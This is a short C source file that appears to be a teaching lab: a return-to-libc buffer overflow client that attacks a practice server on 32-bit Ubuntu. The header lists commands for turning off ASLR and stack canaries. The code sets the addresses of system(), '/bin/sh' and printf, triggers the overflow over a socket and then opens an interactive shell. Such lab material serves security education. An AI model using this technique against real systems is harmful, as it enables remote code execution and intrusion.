/***********************************************************************
				Buffer Overflow Attack under NO ASLR and NO CANARY
	(1) Tested on 32-bit Ubuntu 12.4
	(2) Please turn off ASLR and Stack canaries.
		sudo -s
		echo 0 >/proc/sys/kernel/randomize_va_space
		exit

		gcc -fno-stack-protector -fno-dwarf2-cfi-asm server.c -o server
	(3) The addresses of system() and "/bin/sh" should be determined beforehand.
	(4) TARGET_BUF_SIZE depends on server.s

	sheisc@163.com
************************************************************************/

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h> 

#include "util.h"

static struct payload pload;

static struct server_info s_info = {
	.system_func_addr = SYSTEM_FUNC_ADDR,
	.shell_str_addr = SHELL_STR_ADDR,
	.printf_got_addr = PRINTF_GOT_ADDR,
	.stack_lifting = STACK_LIFTING_CNT,
	.printf_func_addr = PRINTF_FUNC_ADDR,	
};



static void request(int sock){
	buffer_overflow(sock,&s_info);
	REPL(sock,WITH_NORMAL_OUTPUT);
}

int main(int argc, char **argv){
	do_it(argc,argv,request);
}

